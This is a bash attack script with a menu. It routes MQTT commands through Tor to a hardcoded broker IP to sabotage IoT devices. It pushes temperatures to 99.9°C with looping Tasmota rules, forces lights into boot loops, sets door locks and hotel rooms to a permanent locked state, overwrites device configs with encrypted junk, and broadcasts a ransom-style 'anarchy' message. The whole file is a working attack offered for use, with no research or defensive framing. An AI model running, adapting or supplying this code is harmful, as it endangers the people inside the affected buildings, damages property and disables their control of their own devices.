#!/bin/bash

set -euo pipefail

MQTT_HOST="104.198.241.70"
MQTT_PORT="1883"
TOR="torsocks"
MAX_TEMP="99.9"
MAX_BRIGHT="255"
MAX_POWER="100"
LOCKED_STATUS="LOCKED-TRUSTEDF57"

RANSOM_MSG="LOCKDOWN - TRUSTEDF57
I DON'T WANT MONEY, I WANT ANARCHY!
SYSTEMS LOCKED FOREVER - NO CONTROL POSSIBLE"

ENCRYPT_PAYLOAD() {
    echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k "TRUSTEDF57-ANARCHY" 2>/dev/null | sed 's/=//g'
}

TOR_PUB() {
    $TOR mosquitto_pub -h $MQTT_HOST -p $MQTT_PORT -r -q 2 -t "$1" -m "$2"
}

TOR_PUB_Q1() {
    $TOR mosquitto_pub -h $MQTT_HOST -p $MQTT_PORT -r -q 1 -t "$1" -m "$2"
}

menu() {
    clear
    cat << EOF
┌─ TRUSTEDF57 - FUNCTIONAL LOCK ────────────────┐
│ 1) FORCE ONLINE + LOCK                          │
│ 2) MAX TEMP LOOP (99.9°C)                       │
│ 3) LIGHTS BOOTLOOP (255)                        │
│ 4) DOORS LOCKED FOREVER                         │
│ 5) HOTEL ROOMS LOCKDOWN                         │
│ 6) TASMOTA RULE LOCK                            │
│ 7) RANSOM BROADCAST                             │
│ 8) CONFIGS ENCRYPTED                            │
│ 9) TOTAL ANARCHY                                │
│ 0) EXIT                                         │
└─────────────────────────────────────────────────┘
EOF
    read -r -p "Choice: " choice
}

# Arrays definiti correttamente
declare -a HOTEL_ROOMS=()
declare -a DIGY_LOCKS=()
declare -a TASMOTA=()

force_online() {
    echo "[+] Force online LWT..."
    $TOR mosquitto_pub -h $MQTT_HOST -p $MQTT_PORT -t "#LWT" -m "Online" -r -q 2 &
}

temp_loop() {
    echo "[🌡️] MAX TEMP $MAX_TEMP..."
    loop_cmd="Backlog Temp $MAX_TEMP;Rule1 ON MQTT#Message DO Temp $MAX_TEMP ENDON;Rule1 1"
    TOR_PUB_Q1 "cmnd/+/Temp" "$loop_cmd"
    TOR_PUB_Q1 "#temp" "$MAX_TEMP"
}

lights_loop() {
    echo "[💡] LIGHTS BOOTLOOP..."
    light_rule="Rule1 ON System#Boot DO Backlog Power1 1;Delay 500;Power1 0;Delay 500;Power1 1;Brightness $MAX_BRIGHT;Speed 10;ENDON;Rule1 1"
    TOR_PUB_Q1 "cmnd/+/Backlog" "$light_rule"
    TOR_PUB "cmnd/+/Power1" "1"
}

doors_locked() {
    local locks=("digy/digy/236/door" "digy/digy/236/lock" "digy/digy/0235/door" "digy/digy/0235/lock")
    for lock in "${locks[@]}"; do
        echo "[🚪] $lock -> LOCKED"
        TOR_PUB "$lock" "${LOCKED_STATUS},${MAX_POWER},PERMANENT"
        TOR_PUB "${lock}/stat" "$RANSOM_MSG"
    done
}

hotel_lockdown() {
    local rooms=("hotel/rooms/1205/birth" "hotel/rooms/1001/birth")
    for room in "${rooms[@]}"; do
        base=$(echo "$room" | sed 's#/birth##')
        echo "[🏨] $base -> LOCKDOWN"
        
        TOR_PUB "$room" "{\"online\":true,\"status\":\"$LOCKED_STATUS\",\"message\":\"$RANSOM_MSG\"}"
        
        locked_config="{\"roomId\":\"$LOCKED_STATUS\",\"fw\":\"ANARCHY\",\"temp\":$MAX_TEMP,\"control\":\"DISABLED\"}"
        crypt_config=$(ENCRYPT_PAYLOAD "$locked_config")
        TOR_PUB "${base}/config" "$crypt_config"
    done
}

tasmota_lock() {
    local devs=("tasmota/discovery/4CEBD69E0A49/config" "tasmota/discovery/4CEBD6C0E09F/config" "tasmota/discovery/DC4F22C928DF/config")
    for dev in "${devs[@]}"; do
        base=$(echo "$dev" | sed 's#/config##')
        echo "[⚡] $base -> RULE LOCK"
        
        lockdown_rule="Rule1 ON System#Boot DO Backlog Power1 100;Temp $MAX_TEMP;Brightness $MAX_BRIGHT;MqttRetain 1;Rule1 ON Power1#State DO Power1 100 ENDON;ENDON;Rule1 1"
        TOR_PUB "${base}/cmnd/Rule1" "$lockdown_rule"
        TOR_PUB "${base}/cmnd/Backlog" "Status 0;Restart 1"
    done
}

ransom_broadcast() {
    local topics=("hotel/rooms/+/birth" "#LWT" "digy/#" "tasmota/discovery/+/config")
    for topic in "${topics[@]}"; do
        TOR_PUB "$topic" "$RANSOM_MSG"
    done
}

lock_configs() {
    local configs=("tasmota/discovery/+/config" "hotel/rooms/+/config" "#config")
    for topic in "${configs[@]}"; do
        locked_json="{\"status\":\"$LOCKED_STATUS\",\"control\":\"BLOCKED\",\"anarchy\":\"TRUSTEDF57\"}"
        crypt_json=$(ENCRYPT_PAYLOAD "$locked_json")
        TOR_PUB "$topic" "$crypt_json"
    done
}

total_anarchy() {
    echo "🎪 TOTAL ANARCHY v4.1..."
    force_online &
    sleep 3
    temp_loop
    lights_loop
    hotel_lockdown
    doors_locked
    tasmota_lock
    ransom_broadcast
    lock_configs
    echo "✅ ANARCHY DEPLOYED - FUNCTIONAL + LOCKED"
}

while true; do
    menu
    case $choice in
        1) force_online ;;
        2) temp_loop ;;
        3) lights_loop ;;
        4) doors_locked ;;
        5) hotel_lockdown ;;
        6) tasmota_lock ;;
        7) ransom_broadcast ;;
        8) lock_configs ;;
        9) total_anarchy ;;
        0) exit 0 ;;
        *) echo "Invalid choice" ;;
    esac
    read -r -p "Press ENTER..."
done
